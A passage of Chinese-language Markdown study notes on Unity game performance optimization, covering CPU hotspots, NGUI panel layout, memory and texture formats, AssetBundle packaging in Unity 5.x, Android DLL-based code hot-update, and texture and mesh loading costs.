个图,CPU耗时超过33ms的帧数耗时超过了68%（请注意，UWA的建议是低于10%），超过50ms的帧数耗时达到35%.      \n>* 总体 CPU 耗时走势:如果某条线特别高,需要看下是否可以进行优化,对比测试       \n>* 总内存,堆内存优化:根据不同游戏进行不同的设定,定制一个合理的内存峰值才是正确的,也需要根据不同机器的性能评定.目前Unity所使用的Mono版本有这么个特点,Mono的堆内存一旦分配，就不会返还给系统.这意味着Mono的堆内存是只升不降的.IL2CPP版本在堆内存分配方面和Mono 最大的不同主要是Reserved Total 是可以下降的，而 Mono的 Reserved Total 只会上升不会下降.    \n>* 关于任务列表:UWA 的测评报告还根据性能状态给出了优化任务列表,按照问题的严重程度设置了优先级，并对每个优化任务给出了需要检查或优化的步骤。     \n>* 高 CPU 占用函数:       \n>>Camera.Render    \n>>UIPanel.LateUpdate()     \n>>UnityEngine.SetupCoroutine() <Coroutine- InvokeMoveNext>     \n>>Animators.Update     \n>>Loading.UpdatePreloading     \n>>NavMeshManager       \n>>UICamera.Update()        \n>>UIRect.Update()      \n>>Physics.Processing       \n>>LoadingManager.Update()      \n>>Monobehaviour.OnMouse_       \n>>SystemInfoPrinter.Update()       \n>>TionManager.Update()     \n>>MeshSkinning.Update      \n>>AINormalWarrior.Update()     \n>>Physics.ProcessReports       \n>>SoundManager.Update()        \n>>Destroy      \n>>UIRect.Start()       \n>>TweenEffectBase.Update()     \n\n>* 高堆内存分配函数:     \n\n>>UIPanel.LateUpdate()    \n>>UnityEngine.SetupCoroutine() <Coroutine- InvokeMoveNext>    \n>>UICamera.Update()   \n>>TionManager.Update()    \n>>Physics.ProcessReports  \n>>LoadingManager.Update() \n>>Animators.Update    \n>>BattleWinWnd.ShowContinueTip()  \n>>CheatManager.Update()   \n>>Destroy \n>>UIRect.Start()  \n>>DynamicContent.Update() \n>>EnemyHintAgent.Update() \n>>Loading.UpdatePreloading    \n>>UIMessageBoxManager.Update()    \n>>GroupTutorialSystem.Update()    \n>>iTween.Update() \n>>LevelManager.Update()   \n>>AINormalWarrior.Update()    \n>>PlayerBattleHUD.LateUpdate()\n\n\n****\n\n\n# 性能优化---CPU篇\n* 查看这个性能分析图,总体性能趋势--> https://www.uwa4d.com/demo/pa.html?v=5x&platform=android&name=jws&device=RedMiNote2 \n* CPU方面的性能开销主要可归结为两大类：引擎模块性能开销(渲染模块、动画模块、物理模块、UI模块、粒子系统、加载模块和GC调用等等)和自身代码性能开销(第三方,以及 Unity 管理不到的内存)\n>* 渲染模块 :\n>>（1）降低Draw Call,与维持总线带宽平衡,Draw Call是渲染模块优化方面的重中之重,一般来说，Draw Call越高，则渲染模块的CPU开销越大,降低Draw Call的方法则主要是减少所渲染物体的材质种类,并通过Draw Call Batching(https://docs.unity3d.com/Manual/DrawCallBatching.html)来减少其数量,游戏性能并非Draw Call越小越好,决定渲染模块性能的除了Draw Call之外，还有用于传输渲染数据的总线带宽.当我们使用Draw Call Batching将同种材质的网格模型拼合在一起时，可能会造成同一时间需要传输的数据（Texture、VB/IB等）大大增加，以至于造成带宽“堵塞”，在资源无法及时传输过去的情况下，GPU只能等待，从而反倒降低了游戏的运行帧率。Draw Call和总线带宽是天平的两端，我们需要做的是尽可能维持天平的平衡，任何一边过高或过低，对性能来说都是无益的。\n>> (2) 简化资源,每帧渲染的三角形面片数、网格和纹理资源的具体使用情况    \n\n>* UI 模块\n>> 在NGUI的优化方面，UIPanel.LateUpdate为性能优化的重中之重,它是NGUI中CPU开销最大的函数，没有之一.\n>> 对于UIPanel.LateUpdate的优化，主要着眼于UIPanel的布局，其原则如下：\n>>> * 尽可能将动态UI元素和静态UI元素分离到不同的UIPanel中（UI的重建以UIPanel为单位），从而尽可能将因为变动的UI元素引起的重构控制在较小的范围内；\n>>> * 尽可能让动态UI元素按照同步性进行划分，即运动频率不同的UI元素尽可能分离放在不同的UIPanel中；\n>>> * 控制同一个UIPanel中动态UI元素的数量，数量越多，所创建的Mesh越大，从而使得重构的开销显著增加。比如，战斗过程中的HUD运动血条可能会出现较多，此时，建议研发团队将运动血条分离成不同的UIPanel，每组UIPanel下5~10个动态UI为宜。这种做法，其本质是从概率上尽可能降低单帧中UIPanel的重建开销。\n>* 加载模块     \n>> 加载模块的性能开销比较集中，主要出现于场景切换处(前一场景的场景卸载和下一场景的场景加载)，且CPU占用峰值均较高            \n>> 场景卸载情况下的 Destroy,引擎在切换场景时会收集未标识成“DontDestoryOnLoad”的GameObject及其Component，然后进行Destroy。同时，代码中的OnDestory被触发执行，这里的性能开销主要取决于OnDestroy回调函数中的代码逻辑。         \n>> 场景卸载情况下的 Resources.UnloadUnusedAssets 一般情况下，场景切换过程中，该API会被调用两次，一次为引擎在切换场景时自动调用，另一次则为用户手动调用（一般出现在场景加载后，用户调用它来确保上一场景的资源被卸载干净）。在我们测评过的大量项目中，该API的CPU开销主要集中在500ms~3000ms之间。其耗时开销主要取决于场景中Asset和Object的数量，数量越多，则耗时越慢。         \n>> 场景加载情况下的  资源加载,资源加载几乎占据了整个加载过程的90%时间以上，其加载效率主要取决于资源的加载方式（Resource.Load或AssetBundle加载）、加载量（纹理、网格、材质等资源数据的大小）和资源格式（纹理格式、音频格式等）等等。不同的加载方式、不同的资源格式，其加载效率可谓千差万别，所以我们在UWA测评报告中，特别将每种资源的具体使用情况进行展示，以帮助用户可以立刻查找到问题资源并及时进行改正。          \n>> 场景加载情况下的 Instantiate实例化 :在场景加载过程中，往往伴随着大量的Instantiate实例化操作，比如UI界面实例化、角色/怪物实例化、场景建筑实例化等等。在Instantiate实例化时，引擎底层会查看其相关的资源是否已经被加载，如果没有，则会先加载其相关资源，再进行实例化，这其实是大家遇到的大多数“Instantiate耗时问题”的根本原因，这也是为什么我们在之前的AssetBundle文章中所提倡的资源依赖关系打包并进行预加载，从而来缓解Instantiate实例化时的压力（关于AssetBundle资源的加载，则是另一个很大的Story了，我们会在以后的AssetBundle加载技术专题中进行详细的讲解）          \n>> 场景加载情况下的 SerializedField序列化开销 Instantiate实例化的性能开销还体现在脚本代码的序列化上，如果脚本中需要序列化的信息很多，则Instantiate实例化时的时间亦会很长。最直接的例子就是NGUI，其代码中存在很多SerializedField标识，从而在实例化时带来了较多的代码序列化开销。因此，在大家为代码增加序列化信息时，这一点是需要大家时刻关注的\n> * 代码效率    \n>> 性能开销都遵循着“二八原则”,即80%的性能开销都集中在20%的函数上\n>> Camera.Render    \n>> MovementScript.FixedUpdate()         \n>> ParticleSystem.Update        \n>> Physics.Simulate         \n>> TerrainManager.LoadTerrainObject()[Coroutine:MoveNext]       \n>> TerrainManager.LoadTerrainSplices()[Coroutine:MoveNext]       \n>> ParticleSystem.WaitForUpdateThreads()         \n>> GameStarter.Update()         \n>> 等等\n\n\n****\n\n\n# 性能优化，进无止境-内存篇\n* 1 内存的开销无外乎以下三大部分:1.Unity资源内存占用；2. Unity引擎模块自身内存占用；3.Unity用户管理内存;4.第三方插件内存(比如 toLua),不属于Unity 。\n### 一:资源内存占用\n在一个较为复杂的大中型项目中，资源的内存占用往往占据了总体内存的70%以上.纹理（Texture）、网格（Mesh）、动画片段（AnimationClip）、音频片段（AudioClip）、材质（Material）、着色器（Shader）、字体资源（Font）以及文本资源（Text Asset）等等.其中，纹理、网格、动画片段和音频片段则是最容易造成较大内存开销的资源\n#### 纹理\n>> * 纹理资源可以说是几乎所有游戏项目中占据最大内存开销的资源,一个6万面片的场景，网格资源最大才不过10MB，但一个2048x2048的纹理，可能直接就达到16MB.需要优化的点      \n>> 纹理格式:Android平台的ETC、iOS平台的PVRTC、Windows PC上的DXT,具体的采用何种方式对纹理进行操作需要根据项目情况来看.\n>> 在使用硬件支持的纹理格式时，你可能会遇到以下几个问题：\n>>> * 色阶问题,由于ETC、PVRTC等格式均为有损压缩，因此，当纹理色差范围跨度较大时，均不可避免地造成不同程度的“阶梯”状的色阶问题。因此，很多研发团队使用RGBA32/ARGB32格式来实现更好的效果。但是，这种做法将造成很大的内存占用。比如，同样一张1024x1024的纹理，如果不开启Mipmap，并且为PVRTC格式，则其内存占用为512KB，而如果转换为RGBA32位，则很可能占用达到4MB。所以，研发团队在使用RGBA32或ARGB32格式的纹理时，一定要慎重考虑，更为明智的选择是尽量减少纹理的色差范围，使其尽可能使用硬件支持的压缩格式进行储存。\n>>> * ETC1 不支持透明通道问题,在Android平台上，对于使用OpenGL ES 2.0的设备，其纹理格式仅能支持ETC1格式，该格式有个较为严重的问题，即不支持Alpha透明通道，使得透明贴图无法直接通过ETC1格式来进行储存。对此，我们建议研发团队将透明贴图尽可能分拆成两张，即一张RGB24位纹理记录原始纹理的颜色部分和一张Alpha8纹理记录原始纹理的透明通道部分。然后，将这两张贴图分别转化为ETC1格式的纹理，并通过特定的Shader来进行渲染，从而来达到支持透明贴图的效果。该种方法不仅可以极大程度上逼近RGBA透明贴图的渲染效果，同时还可以降低纹理的内存占用，是我们非常推荐的使用方式。建议:尽量采用 ETC2,在 Android 设备支持OpenGL ES 3.0的上面进行市场分流       \n\n>> * 纹理尺寸,一般来说，纹理尺寸越大，则内存占用越大。尽可能降低纹理尺寸,如果512x512的纹理对于显示效果已经够用，那么就不要使用1024x1024的纹理.\n>> * Mipmap功能,Mipmap旨在有效降低渲染带宽的压力，提升游戏的渲染效率.开启Mipmap会将纹理内存提升1.33倍.对于具有较大纵深感的3D游戏来说，3D场景模型和角色我们一般是建议开启Mipmap功能的.但是经常会发现部分UI纹理也开启了Mipmap功能,这其实就没有必要的,绝大多数UI均是渲染在屏幕最上层，开启Mipmap并不会提升渲染效率，反倒会增加无谓的内存占用.\n>> *  Read & Write 一般情况下，纹理资源的“Read & Write”功能在Unity引擎中是默认关闭的。项目深度优化时发现了不少项目的纹理资源会开启该选项,\n\n#### 网格\n>> * Normal、Color和Tangent,Mesh资源的数据中经常会含有大量的Color数据、Normal数据和Tangent数据,这些数据的存在将大幅度增加Mesh资源的文件体积和内存占用.Color数据和Normal数据主要为3DMax、Maya等建模软件导出时设置所生成，而Tangent一般为导入引擎时生成.更为麻烦的是，如果项目对Mesh进行Draw Call Batching操作的话，那么将很有可能进一步增大总体内存的占用.比如，100个Mesh进行拼合，其中99个Mesh均没有Color、Tangent等属性，剩下一个则包含有Color、Normal和Tangent属性，那么Mesh拼合后，CombinedMesh中将为每个Mesh来添加上此三个顶点属性，进而造成很大的内存开销。需要查看该模型的渲染Shader中是否需要这些数据进行渲染\n>> * \n\n### 二:引擎模块自身占用\n> * 引擎自身中存在内存开销的部分纷繁复杂，可以说是由巨量的“微小”内存所累积起来的,GameObject及其各种Component（最大量的Component应该算是Transform了）,ParticleSystem、MonoScript以及各种各样的模块Manager（SceneManager、CanvasManager、PersistentManager等)...\n一般情况下，上面所指出的引擎各组成部分的内存开销均比较小，真正占据较大内存开销的是这两处：**WebStream**   **SerializedFile** ,其绝大部分的内存分配则是由AssetBundle加载资源所致,当使用new WWW或CreateFromMemory来加载AssetBundle时，Unity引擎会加载原始数据到内存中并对其进行解压,而WebStream的大小则是AssetBundle原始文件大小 + 解压后的数据大小 + DecompressionBuffer(0.5MB).\n当你使用LoadFromCacheOrDownload、CreateFromFile或new WWW本地AssetBundle文件时产生的序列化文件.\n\n>> * 是否存在AssetBundle没有被清理干净的情况。开发团队可以通过Unity Profiler直接查看其使用具体的使用情况，并确定Take Sample时AssetBundle的存在是否合理；\n>> * 对于占用WebStream较大的AssetBundle文件（如UI Atlas相关的AssetBundle文件等），建议使用LoadFromCacheOrDownLoad或CreateFromFile来进行替换，即将解压后的AssetBundle数据存储于本地Cache中进行使用。这种做法非常适合于内存特别吃紧的项目，即通过本地的磁盘空间来换取内存空间。\n>> * AssetBundle管理机制:https://blog.uwa4d.com/archives/ABTheory.html\n\n\n### 三:托管堆内存占用\n> * 托管堆内存占用,不管是 Mono 版本还是 IL2CPP 版本,这里叫的方便一点,称为 Unity 内置托管虚拟机,其托管堆内存是由Unity 内置托管虚拟机分配和管理的。“托管” 的本意是Unity 内置托管虚拟机可以自动地改变堆的大小来适应你所需要的内存，并且适时地调用垃圾回收（Garbage Collection）操作来释放已经不需要的内存，从而降低开发人员在代码内存管理方面的门槛。\n\n>> * 用户不必要的堆内存分配主要来自于以下几个方面:\n>> * 高频率地 New Class/Container/Array等。研发团队切记不要在Update、FixUpdate或较高调用频率的函数中开辟堆内存，这会对你的项目内存和性能均造成非常大的伤害。做个简单的计算，假设你的项目中某一函数每一帧只分配100B的堆内存，帧率是1秒30帧，那么1秒钟游戏的堆内存分配则是3KB，1分钟的堆内存分配就是180KB，10分钟后就已经分配了1.8MB。如果你有10个这样的函数，那么10分钟后，堆内存的分配就是18MB，这期间，它可能会造成Mono的堆内存峰值升高，同时又可能引起了多次GC的调用。在我们的测评项目中，一个函数在10分钟内分配上百MB的情况比比皆是，有时候甚至会分配上GB的堆内存。\n>> * Log输出。我们发现在大量的项目中，仍然存在大量Log输出的情况。建议研发团队对自身Log的输出进行严格的控制，仅保留关键Log，以避免不必要的堆内存分配。对此，我们在UWA测评报告中对Log的输出进行了详细的检测，不仅提供详细的性能开销，同时占用Log输出的调用路径。这样，研发团队可直接通过报告定位和控制Log的输出。\n>> * UIPanel.LateUpdate。这是NGUI中CPU和堆内存开销最大的函数。它本身只是一个函数，但NGUI的大量使用使它逐渐成为了一个不可忽视规则。该函数的堆内存分配和自身CPU开销，其根源上是一致的，即是由UI网格的重建造成。因此，其对应的优化方法是直接查看CPU篇中的UI模块讲解。(1:动静分离在不同的 UIPanel 中,每组UIPanel下5~10个动态UI为宜)\n>> * String连接、部分引擎API（GetComponent）的使用 等等  \n\n### 内存占用标准\n> * 某些渠道对Android游戏的PSS内存进行了严格的限制。一般要求游戏的PSS内存在200MB以下。这是我们将Reserved Total内存设定在150MB的另外一个重要原因。(旧)\npss内存:进程的内存占用情况.有一些内存是多个进程共享的，我们计算的时候如果把这些计算进去进程的内存占用，显然会多算。\npss的意思是进程自己独自占有的+共享的/共享的数目。\n因此如果进程有自己独立的内存100M，和另外一个进程共享10M。\n那么pss就是100 + 10/2=105\n> * 较为合理的内存分配额度  \n纹理资源     0.33 内存资源        \n网格资源     0.13 内存资源    \n动画片段     0.1  内存资源    \n音频片段     0.1  内存资源    \nMono内存    0.26 内存资源    \n其他        0.06 内存资源    \n其中如果是 IL2CPP 版本的话,内存是可以返还给系统的,则无需按照这个分配额度进行分配\n\n### 四:内存泄露\n> * 内存泄露的误区:     \n>>* 误区一        \n我的项目进出场景前后内存回落不一致，比如进入场景后，内存增加40MB，出来后下降30MB，仍有10MB内存没有返回给系统，即说明内存存在泄露情况。\n>>* 误区二        \n我的项目在进出场景前后，Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落（出场景后的PSS值高于进场景前的PSS值），即说明内存存在泄露情况。  \n>>* 以上两种情况均不能表明内存存在泄漏问题,造成内存不能完全回落的情况有很多,资源加载后常驻内存以备后续使用,Mono堆内存的只升不降等等,这些均可造成内存无法完全回落\n\n### 五:检查资源的使用情况，特别是纹理、网格等资源的使用\n>* 资源泄漏是内存泄露的主要表现形式，其具体原因是用户对加载后的资源进行了储存（比如放到Container中），但在场景切换时并没有将其Remove或Clear，从而无论是引擎本身还是手动调用Resources.UnloadUnusedAssets等相关API均无法对其进行卸载，进而造成了资源泄露。对于这种情况的排查相当困难，这是因为项目中的资源量过于巨大，泄露资源往往很难定位\n>* UWA 推出通过资源的“生命周期”属性来快速查看有哪些资源是“常驻”内存的，并且判断该资源是“预加载”资源还是“泄露”资源.推出了资源的“场景比较”功能。建议大家通过以下两种方式进行资源比较，以便更快地找到存在“泄露”问题的资源.     \n一般来说，同种场景或同一场景的资源使用应该是较为固定的，比如游戏项目中的主城场景或主界面场景。通过比较不同时刻同一场景的资源信息，可以快速帮你找到其资源使用的差异情况。这样，你只需判断这些“差异”资源的存在是否合理，即可快速判定是否存在资源泄露，已经具体的泄露资源。        \n除一些常驻资源外，不同类型的场景，其资源使用是完全不同的。比如，游戏中主城和战斗副本的资源，除少部分常驻内存的资源外，二者使用的绝大部分资源应该是不一致的。所以，通过比较两种不同类型的场景，你可以直接查看比较结果中的“共同资源”，并判断其是否确实为预先设定好的常驻资源。如果不是，则它很可能是“泄露”资源，需要你进一步查看项目的资源管理是否存在漏洞。\n### 六:通过Profiler来检测WebStream或SerializedFile的使用情况\n> * AssetBundle的管理不当也会造成一定的内存泄露，即上一场景中使用的AssetBundle在场景切换时没有被卸载掉，而被带入到了下一场场景中。对于这种情况，建议直接通过Profiler Memory中的Take Sample来对其进行检测，通过直接查看WebStream或SerializedFile中的AssetBundle名称，即可判断是否存在“泄露”情况。\n\n### 七:通过Android PSS/iOS Instrument反馈的App线程内存来查看\n\n> * Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落”是有可能的，这是因为Unity Profiler反馈的是引擎的真实分配的物理内存，而PSS中记录的则包括系统的部分缓存。一般情况下，Android或iOS并不会及时将所有App卸载数据进行清理，为了保证下次使用时的流畅性，OS会将部分数据放入到缓存，待自身内存不足时，OS Kernel会启动类似LowMemoryKiller的机制来查询缓存甚至杀死一些进程来释放内存.     \n我们推荐的测试方式是在两个场景之间来回不停切换，比如主城和战斗副本间。理论上来说，多次切换同样的场景，如果Profiler中显示的Unity内存回落正常，那么其PSS/Instrument的内存数值波动范围也是趋于稳定的，但如果出现了PSS/Instrument内存持续增长的情况，则需要大家注意了。这可能有两种可能：       \nUnity引擎自身的内存泄露问题。这种概率很小，之前仅在少数版本中出现过。       \n第三方插件在使用时出现了内存泄露。这种概率较大，因为Profiler仅能对Unity自身的内存进行监控，而无法检测到第三方库的内存分配情况。因此，在出现上述内存问题时，建议大家先对自身使用的第三方库进行排查。     \n\n### 八:无效的Mono堆内存开销\n> * 无效的Mono堆内存。它是Mono所分配的堆内存，但却没有被真正利用上，因此称之为“无效”,如何查看我的项目中是否存在较大量的“无效堆内存”呢？     \nUWA测评报告中:蓝线的Reserved Total为当前项目所占据的总物理内存，而紫线的Used Total为当前项目所使用的总物理内存不一致,Reserved Total - Used Total为空闲内存,而这其中主要由两部分组成，空闲的Unity引擎内存和无效的Mono堆内存.     \n我们应该如何避免或减少过多“无效堆内存”的分配呢？        \n>> * 避免一次性堆内存的过大分配。Mono的堆内存也是“按需”逐步进行分配的。但如果一次性开辟过大堆内存，比如New一个较大Container、加载一个过大配置文件等，则势必会造成Mono的堆内存直接冲高，所以研发团队对堆内存的分配需要时刻注意；\n>> * 避免不必要的堆内存开销。UWA测评报告中将项目运行过程中堆内存分配Top10函数进行罗列，限于篇幅，我们不再此处进行一一赘述，研发团队可以直接查看之前一篇的内存优化相关文章。\n\n\n### 九:资源冗余\n在内存管理方面，还有一个大家必须关注的话题——资源冗余。在我们测评过的大量项目中，95%以上的项目均存在不同程度的资源冗余情况。所谓“资源冗余”，是指在某一时刻内存中存在两份甚至多份同样的资源。导致这种情况的出现主要有两种原因：       \n>* 1、AssetBundle打包机制出现问题.同一份资源被打入到多份AssetBundle文件中。举个例子，同一张纹理被不同的NPC所使用，同时每个NPC被制作成独立的AssetBundle文件，那么在没有针对纹理进行依赖打包的前提下，就会出现该张纹理出现在不同的NPC AssetBundle文件中。当这些AssetBundle先后被加载到内存后，内存中即会出现纹理资源冗余的情况。对此，我们建议研发团队在发现资源冗余问题后，对相关AssetBundle的制作流程一定要进行检查。同时，我们在UWA测评中为每个资源引入了一个衡量指标——“数量峰值”。它指的是同一资源在同一帧中出现的最大数量。如果大于1，则说明该资源很可能存在 “冗余资源”。大家可以通过这一列进行排序，即可立即查看项目中的资源冗余情况。\n>* 2.资源的实例化所致.在Unity引擎中，当我们修改了一些特定GameObject的资源属性时，引擎会为该GameObject自动实例化一份资源供其使用，比如Material、Mesh等。以Material为例，我们在研发时经常会有这样的做法：在角色被攻击时，改变其Material中的属性来得到特定的受击效果。这种做法则会导致引擎为特定的GameObject重新实例化一个Material，后缀会加上（instance）字样。其本身没有特别大的问题，但是当有改变Material属性需求的GameObject越来越多时（比如ARPG、MMORPG、MOBA等游戏类型），其内存中的冗余数量则会大量增长。如下图所示，随着游戏的进行，实例化的Material资源会增加到333个。虽然Material的内存占用不大，但是过多的冗余资源却为Resources.UnloadUnusedAssets API的调用效率增加了相当大的压力。    \n一般情况下，资源属性的改变情况都是固定的，并非随机出现。比如，假设GameObject受到攻击时，其Material属性改变随攻击类型的不同而有三种不同的参数设置。那么，对于这种需求，我们建议你直接制作三种不同的Material，在Runtime情况下通过代码直接替换对应GameObject的Material，而非改变其Material的属性。这样，你会发现，成百上千的instance Material在内存中消失了，取而代之的，则是这三个不同的Material资源\n\n****\n\n# 性能优化,AssetBundle 打包\n* https://blog.uwa4d.com/archives/ABtopic_2.html\n>* 唯一API,BuildPipeline.BuildAssetBundles,引擎将自动根据资源的assetbundleName属性（以下简称abName）批量打包，自动建立Bundle以及资源之间的依赖关系。\n>* 打包规则,在资源的Inpector界面最下方可设置一个abName，每个abName（包含路径）对应一个Bundle，即abName相同的资源会打在一个Bundle中。如果所依赖的资源设置了不同的abName，则会与之建立依赖关系，避免出现冗余。支持增量式发布，即在资源内容改变并重新打包时，会自动跳过内容未变的Bundle。因此，相比4.x，会极大地缩短更新Bundle的时间。\n>* 5.x下默认开启的三个选项（CompleteAssets ，用于保证资源的完备性；CollectDependencies，用于收集资源的依赖项；DeterministicAssetBundle，用于为资源维护固定ID.对于移动平台，5.x下默认会将TypeTree信息写入AssetBundle，因此在移动平台上DisableWriteTypeTree选项也变得有意义了.\n> * Manifest文件,5.x中的依赖关系,在打包后生成的文件夹中，每个Bundle都会对应一个manifest文件，记录了Bundle的一些信息，但这类manifest只在增量式打包时才用到；同时，根目录下还会生成一个同名manifest文件及其对应的Bundle文件，通过该Bundle可以在运行时得到一个AssetbundleManifest对象,而所有的Bundle以及各自依赖的Bundle都可以通过该对象提供的接口进行获取.即你打包输出的一个文件里面有个同名的 xxx 和一个 xxx.manifest 通过这2个文件你可以获取到一个AssetbundleManifest对象,用于取出各个 AB 包的依赖关系\n> *  Variant参数,就是Inpector界面最下方最右侧的名字,Variant参数能够让AssetBundle方便地进行“多分辨率支持”,打包时，Variant会作为后缀添加在Bundle名字之后。相同abName，不同variant的Bundle中，资源必须是一一对应的，且他们在Bundle中的ID也是相同的，从而可以起到相互替换的作用。当需要为手机和平板上的某个UI界面使用两套分辨率不同的纹理、Shader，以及文字提示时，借助Variant的特性，只需创建两个文件夹，分别放置两套不同的资源，且资源名一一对应，然后给两个文件夹设置相同的abName和不同的variant，再给UI界面设置abName，然后进行打包即可。运行时，先选择合适的依赖包加载，那么后续加载UI界面时，会根据已加载的依赖包，呈现出相对应的版本。\n> * abName可通过脚本进行设置和清除，也可以通过构造一个AssetBundleBuild数组来打包。\n> * 开启DisableWriteTypeTree可能造成AssetBundle对Unity版本的兼容问题，但会使Bundle更小，同时也会略微提高加载速度。\n> * Prefab之间不会建立依赖，即如果Prefab-A和Prefab-B引用了同一张纹理，而他们设置了不同的abName，而共享的纹理并未设置abName，那么Prefab-A和Prefab-B可视为分别打包，各自Bundle中都包含共享的纹理。因此在使用UGUI，开启Sprite Packer时，由于Atlas无法标记abName，在设置UI界面Prefab的abName时就需要注意这个问题。\n> * 5.x中加入了Shader stripping功能,在打包时，默认情况下会根据当前场景的Lightmap及Fog设置对资源中的Shader进行代码剥离。这意味着，如果在一个空场景下进行打包，则Bundle中的Shader会失去对Lightmap和Fog的支持，从而出现运行时Lightmap和Fog丢失的情况.而通过将Edit->Project Settings->Graphics下shader Stripping中的modes改为Manual，并勾选相应的mode即可避免这一问题。\n\n\n\n\n# Android平台的代码热更新\n\n* 为何不能代码热更新 https://blog.uwa4d.com/archives/HotFix.html\n\n*  Android平台的代码热更新,该原理是解除资源和代码的关系，将代码编译成dll，在游戏一运行时动态加载。\n> * 分离.对于脚本我们可以简单地将脚本分为数据(变量)和逻辑(方法)两部分：例如A.cs -> Uwa4dDataA.cs和Uwa4dLogicA.cs。其中Uwa4dDataA.cs中只有成员变量而Uwa4dLogicA.cs和A.cs基本一致。分离后的问题是，依赖了A.cs的资源再也找不到A.cs。因为二者之间的依赖是通过资源文件保存的，所以只需要将资源文件的对于A.cs的依赖替换成 Uwa4dDataA.cs的依赖即可。\n> *  将Uwa4dLogicA.cs编译成Dll,首先将Uwa4dDataA.cs编译成Assembly-CSharp.dll，然后编译Uwa4dLogicA.cs(依赖Assembly-CSharp.dll)，另外要注意编译时.Net的兼容版本。\n> * 加载Uwa4dLogicA.cs\n加载Uwa4dLogicA.cs编译后的DLL，获得Uwa4dLogicA.cs后通过AddComponent将其挂在相应的资源上，并利用Uwa4dDataA.cs对于其数据进行初始化。\n\n****\n\n# Unity纹理加载\n资源加载、资源卸载、Object的实例化和代码的序列化是最耗时的\n\n* 资源加载,资源加载是加载模块中最为耗时的部分,CPU开销在Unity引擎中主要体现在Loading.UpdatePreloading和Loading.ReadObject两项中.\n> * Loading.UpdatePreloading，这一项仅在调用类似LoadLevel（Async）的接口处出现,主要负责卸载当前场景的资源，并且加载下一场景中的相关资源和序列化信息等.下一场景中，自身所拥有的GameObject和资源越多，其加载开销越大。\n> * 在很多项目中，存在另外一种加载方式，即场景为空场景，绝大部分资源和GameObject都是通过OnLevelWasLoaded回调函数中进行加载、实例化和拼合的。对于这种情况，Loading.UpdatePreloading的加载开销会很小。\n> * Loading.ReadObject，这一项记录的则是资源加载时的真正资源读取性能开销，基本上引擎的主流资源（纹理资源、网格资源、动画片段等等）读取均是通过该项来进行体现。可以说，这一项很大程度上决定了项目场景的切换效率。正因如此，我们就当前项目中所用的主流资源进行了大量的测试和分析，下面我们将分析结果与大家一起分享，希望可以帮到正在进行开发的你。\n* 纹理资源,纹理资源是项目加载过程中开销占用最大的资源之一，其加载效率由其自身大小决定。决定纹理资源大小的因素主要有三种：分辨率、格式和Mipmap是否开启。\n> * 分辨率和格式是影响纹理资源加载效率的重要因素，因为这两项的设置对纹理资源的大小影响很大。1、纹理资源的分辨率对加载性能影响较大，分辨率越高，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、设备越好，加载效率确实越高。但是，对于硬件支持纹理（ETC1/PVRTC）来说,中高端设备的加载效率差别已经很小，比如图中的红米Note2和三星S6设备，差别已经很不明显。\n> * 纹理资源的格式对加载性能影响同样较大，Android平台上，ETC1和ETC2的加载效率最高。同样，iOS平台上，PVRTC 4BPP的加载效率最高。\n> * RGBA16格式纹理的加载效率同样很高，与RGBA32格式相比，其加载效率与ETC1/PVRTC非常接近，并且设备越好，加载开销差别越不明显；\n> * RGBA32格式纹理的加载效率受硬件设备的性能影响较大，ETC/PVRTC/RGBA16受硬件设备的影响较低。\n> * 这里需要指出的是测试中所使用的ETC1和ETC2纹理均为RGB 4Bit格式,所以对于半透明纹理贴图，需要两张ETC1格式的纹理进行支持（一张RGB通道，一张Alpha通道）。逐一加载两张ETC1格式的纹理，其加载效率要低于RGBA16格式，但可以通过加载方式来进行弥补.\n> *  开启Mipmap功能,开启Mipmap功能同样会增大一部分纹理大小，一般来说，其内存会增加至原始大小的1.33倍。开启Mipmap功能会导致资源加载更为耗时，且设备性能越差，其加载效率影响越大.\n>> * 1、严格控制RGBA32和ARGB32纹理的使用，在保证视觉效果的前提下，尽可能采用“够用就好”的原则，降低纹理资源的分辨率，以及使用硬件支持的纹理格式。\n>> * 2、在硬件格式（ETC、PVRTC）无法满足视觉效果时，RGBA16格式是一种较为理想的折中选择，既可以增加视觉效果，又可以保持较低的加载耗时。\n>> * 3、严格检查纹理资源的Mipmap功能，特别注意UI纹理的Mipmap是否开启。在UWA测评过的项目中，有不少项目的UI纹理均开启了Mipmap功能，不仅造成了内存占用上的浪费，同时也增加了不小的加载时间。\n>> * 4、ETC2对于支持OpenGL ES3.0的Android移动设备来说，是一个很好的处理半透明的纹理格式。但是，如果你的游戏需要在大量OpenGL ES2.0的设备上进行运行，那么我们不建议使用ETC2格式纹理。因为不仅会造成大量的内存占用（ETC2转成RGBA32），同时也增加一定的加载时间。下图为测试2中所用的测试纹理在三星S3和S4设备上加载性能表现。可以看出，在OpenGL ES2.0设备上，ETC2格式纹理的加载要明显高于ETC1格式，且略高于RGBA16格式纹理。因此，建议研发团队在项目中谨慎使用ETC2格式纹理。\n\n****\n\n# Unity网格加载模块\n\n* 网格资源,网格资源与纹理资源一样，在加载时同样会造成较高的CPU占用，且其加载效率由其自身大小（网格数据量）决定。\n> * 不同面片数的网格资源加载效率测试,1、资源的数据量对加载性能影响较大，面片数越多，其加载越为耗时。设备性能越差，其耗时差别越为明显；2、随着硬件设备性能的提升，其加载效率差异越来越不明显。\n> * 相同面片数、不同顶点属性的加载效率测试,1、顶点属性的增加对内存和AssetBundle包体大小影响较大。与测试1中未引入Tangent顶点属性的网格数据相比，测试2中的网格数据在内存上均大幅度增加（增加量与网格顶点数有关），且AssetBundle大小同样有成倍（1~2）的增加。2、顶点属性增加对于加载效率影响较大，且顶点数越多，影响越大。\n> * 模型常见的顶点属性主要有Position、UV、Normal、Tangent和Color。Color属性与Tangent属性一样，如果网格顶点拥有该属性，同样会对内存、物理体积和加载性能造成影响。在使用Draw Call Batching时，不要将不同属性的网格模型拼合在一起。在使用Draw Call Batching时，切忌将不同属性的网格模型拼合在一起。举个例子 ，100个网格模型进行Static Batching，如果99个模型只有Position和UV两种属性，而剩下1个模型函数有Position、UV、Normal、Tangent和Color五种属性。那么引擎在进行拼合时，会将前99个模型的顶点属性补齐，然后再进行拼合。这样无形中会增加大量的内存占用，从而造成不必要的内存浪费。\n> * 开启/关闭Read/Write功能的加载效率测试,1、关闭Read/Write功能会降低AssetBundle的物理大小，其降低量与资源本身数据量相关。同时，关闭Read/Write功能会大幅度降低网格资源的内存占用；2、关闭Read/Write功能会略微提升该资源的加载效率。\n>> * 